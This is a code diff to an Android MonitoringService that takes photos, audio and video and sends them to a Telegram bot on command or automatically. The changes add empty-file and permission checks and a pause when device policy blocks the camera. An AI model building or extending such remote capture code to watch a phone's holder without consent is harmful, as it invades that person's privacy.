@@ -3241,6 +3241,21 @@ class MonitoringService : Service() {
                         }
                         return@capturePhoto
                     }
+                    if (!photoFile.exists() || photoFile.length() == 0L) {
+                        cameraAttempt.incrementAndGet()
+                        cameraBusy.set(false)
+                        try {
+                            wd.cancel()
+                        } catch (_: Exception) {
+                        }
+                        deleteQuietly(photoFile)
+                        if (reportResult) {
+                            serviceScope.launch {
+                                sendToTelegram("⚠️ Photo capture produced an empty file. Please try /photo again.")
+                            }
+                        }
+                        return@capturePhoto
+                    }
                     cameraAttempt.incrementAndGet()
                     cameraBusy.set(false)
                     try {
@@ -4001,6 +4016,10 @@ private suspend fun ringDevice(seconds: Int) {
 
     @Suppress("DEPRECATION")
     private suspend fun recordAndSendAudio(seconds: Int) {
+        if (!hasMicPermission()) {
+            sendToTelegram("⚠️ Microphone permission missing. Open Setup and grant Microphone permission.")
+            return
+        }
         if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) {
             sendToTelegram("Rate limited, audio delayed for retry.")
             return
@@ -4102,6 +4121,10 @@ private suspend fun ringDevice(seconds: Int) {
 
     private suspend fun sendAudioFile(audioFile: File): MediaSendOutcome {
         try {
+            if (!audioFile.exists() || audioFile.length() == 0L) {
+                deleteQuietly(audioFile)
+                return MediaSendOutcome.DROPPED
+            }
             if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
             if (NetworkUtils.rateLimitedRemainMs() > 0L) return MediaSendOutcome.KEPT
@@ -4185,6 +4208,21 @@ private suspend fun ringDevice(seconds: Int) {
             recordBusy.set(false)
             serviceScope.launch {
                 sendToTelegram("⚠️ Camera permission missing. Open Setup and grant Camera permission.")
+            }
+            return
+        }
+        if (!hasMicPermission()) {
+            recordBusy.set(false)
+            serviceScope.launch {
+                sendToTelegram("⚠️ Microphone permission missing. Open Setup and grant Microphone permission.")
+            }
+            return
+        }
+        if (isCameraDisabledByPolicy()) {
+            recordBusy.set(false)
+            autoPausePhotosOnPolicyBlock()
+            serviceScope.launch {
+                sendToTelegram("⚠️ Video blocked by device policy (CAMERA_DISABLED). Automatic photos paused for 120 min.")
             }
             return
         }
@@ -4276,6 +4314,10 @@ private suspend fun ringDevice(seconds: Int) {
 
     private suspend fun sendVideoFile(videoFile: File): MediaSendOutcome {
         try {
+            if (!videoFile.exists() || videoFile.length() == 0L) {
+                deleteQuietly(videoFile)
+                return MediaSendOutcome.DROPPED
+            }
             if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
             if (NetworkUtils.rateLimitedRemainMs() > 0L) return MediaSendOutcome.KEPT
@@ -4367,6 +4409,10 @@ private suspend fun ringDevice(seconds: Int) {
             for (file in pending) {
                 if (file == activeVideoFile) continue
                 if (now - file.lastModified() < 10_000L) continue
+                if (!file.exists() || file.length() == 0L) {
+                    deleteQuietly(file)
+                    continue
+                }
                 val videoOutcome = sendVideoFile(file)
                 if (videoOutcome == MediaSendOutcome.KEPT) break
                 if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
@@ -4420,6 +4466,10 @@ private suspend fun ringDevice(seconds: Int) {
             for (file in pending) {
                 if (file == activeAudioFile) continue
                 if (now - file.lastModified() < 10_000L) continue
+                if (!file.exists() || file.length() == 0L) {
+                    deleteQuietly(file)
+                    continue
+                }
                 val audioOutcome = sendAudioFile(file)
                 if (audioOutcome == MediaSendOutcome.KEPT) break
                 if (audioOutcome == MediaSendOutcome.DROPPED) droppedAudio++
@@ -4591,6 +4641,10 @@ private suspend fun ringDevice(seconds: Int) {
 
     private suspend fun sendPhotoFile(photoFile: File): MediaSendOutcome {
         try {
+            if (!photoFile.exists() || photoFile.length() == 0L) {
+                deleteQuietly(photoFile)
+                return MediaSendOutcome.DROPPED
+            }
             if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
             if (NetworkUtils.rateLimitedRemainMs() > 0L) return MediaSendOutcome.KEPT
@@ -4693,6 +4747,10 @@ private suspend fun ringDevice(seconds: Int) {
             for (file in pending) {
                 if (file == activePhotoFile || file == activeShotFile) continue
                 if (now - file.lastModified() < 10_000L) continue
+                if (!file.exists() || file.length() == 0L) {
+                    deleteQuietly(file)
+                    continue
+                }
                 val photoOutcome = sendPhotoFile(file)
                 if (photoOutcome == MediaSendOutcome.KEPT) break
                 if (photoOutcome == MediaSendOutcome.DROPPED) droppedPhotos++
